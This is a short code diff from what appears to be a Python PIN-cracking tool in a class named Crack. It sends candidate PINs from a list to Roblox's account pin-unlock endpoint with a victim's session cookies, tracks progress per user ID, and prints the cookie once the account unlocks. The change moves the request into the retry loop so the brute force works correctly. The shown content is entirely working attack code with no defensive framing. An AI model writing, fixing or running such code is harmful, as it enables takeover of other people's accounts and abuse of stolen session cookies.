@@ -188,14 +188,15 @@ class Crack:
                 progress[str(userid)] = int(line+startingLine)
                 json.dump(progress, f, indent=1)
 
-            request = requests.post("https://auth.roblox.com/v1/account/pin/unlock", headers=headers, data={'pin': pin}, cookies=cookies)
-            response = request.json()
-            status_code = request.status_code
-
             pin = pins[line]
             # --({ Check if the pin was found }) -- #
 
             while True:
+
+                request = requests.post("https://auth.roblox.com/v1/account/pin/unlock", headers=headers, data={'pin': pin}, cookies=cookies)
+                response = request.json()
+                status_code = request.status_code
+
                 try:
                         if "unlockedUntil" in str(response):
                             uiprint("Cookie:", 'cyan')
